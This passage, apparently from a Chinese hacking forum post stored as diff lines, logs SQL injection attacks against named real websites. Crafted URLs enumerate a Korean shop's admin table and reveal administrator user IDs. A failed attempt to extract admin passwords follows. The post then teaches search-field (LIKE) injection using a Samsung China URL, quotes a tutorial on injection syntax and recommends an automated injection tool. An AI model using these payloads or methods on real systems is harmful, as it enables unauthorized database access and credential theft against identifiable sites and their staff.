+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select c_employee_id from(select top 1 * from(select top 3 * from tbl_admin order by 1)T order by 1 desc)S)>0 and &#39;%&#39;=&#39; //得到第三个管理员的id为clark
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select c_employee_id from(select top 1 * from(select top 4 * from tbl_admin order by 1)T order by 1 desc)S)>0 and &#39;%&#39;=&#39; //得到第四个管理员的id为hskim
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select c_employee_id from(select top 1 * from(select top 4 * from tbl_admin order by 1)T order by 1 desc)S)>0 and &#39;%&#39;=&#39; //得到第五个管理员的id为jajeong
+
+http://www.lvhuana.co.kr/product/list_search.aspx?search=Donic%&#39;and (select top 1 c_c_password from tbl_admin)>0 and &#39;%&#39;=&#39; //这个语句是暴出管理员密码的，可惜直接返回了正常页面，郁闷。。。。
+
+一会再想别的办法吧。。。。。
+另外说下，2.3 的啊D支持搜索型的注入方式是：
+
+一般网站的搜索都是部分匹配的
+有漏洞的url是http://notebook.samsung.com.cn/n ... mp;ST=title&SC=
+构造注入语句 三星%&#39;and 1=1 and &#39;%&#39;=&#39;
+　　　　　　三星%&#39;and 1=2 and &#39;%&#39;=&#39;
+大家看到了吧 两个返回页面是不一样的 说明有注入的漏洞 特征字 写笔记本 就是三星%&#39;and 1=1 and &#39;%&#39;=&#39; 返回时有的
+
+我们知道一般搜索代码是这么写的：
+Select * from 表名 where 字段 like ’%关键字%’
+这样就造成了对关键字前后的所有匹配(%是用来全部匹配的)
+这里如果关键字没有过滤的话，就可以这样来构造：
+关键字=’ and [查询条件] and ‘%25’=’
+这样查询就变成
+select * from 表名 where 字段 like &#39;%&#39; and 1=1 and &#39;%&#39;=&#39;%&#39;
+这样就很好的构成了一个sql注入点，当然用手工也可以，用nbsi也可以~~
+注入是不分家的，没必要什么型什么型的！~
+如果不信，大家请看下面的《sql注入天书》的原话
+第一节、ＳＱＬ注入的一般步骤
+首先，判断环境，寻找注入点，判断数据库类型，这在入门篇已经讲过了。
+其次，根据注入参数类型，在脑海中重构SQL语句的原貌，按参数类型主要分为下面三种：
+(A)　ID=49 这类注入的参数是数字型，SQL语句原貌大致如下：
+Select * from 表名 where 字段=49
+注入的参数为ID=49 And [查询条件]，即是生成语句：
+Select * from 表名 where 字段=49 And [查询条件]
+
+(B) Class=连续剧这类注入的参数是字符型，SQL语句原貌大致概如下：
+Select * from 表名 where 字段=’连续剧’
+注入的参数为Class=连续剧’ and [查询条件] and ‘’=’ ，即是生成语句：
+Select * from 表名 where 字段=’连续剧’ and [查询条件] and ‘’=’’
+(C) 搜索时没过滤参数的，如keyword=关键字，SQL语句原貌大致如下：
+Select * from 表名 where 字段like ’%关键字%’
+注入的参数为keyword=’ and [查询条件] and ‘%25’=’，即是生成语句：
+Select * from 表名 where字段like ’%’ and [查询条件] and ‘%’=’%’
+
+当然手工是麻烦的
+用工具的话，我建议用nbsi的工具比较好，就我感觉只有nbsi结合了这个技术，用别的软体是不能注入的
+注入点只要写：
+http://notebook.samsung.com.cn/n ... p;ST=title&SC=%
+再加个特征字符就可以了 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
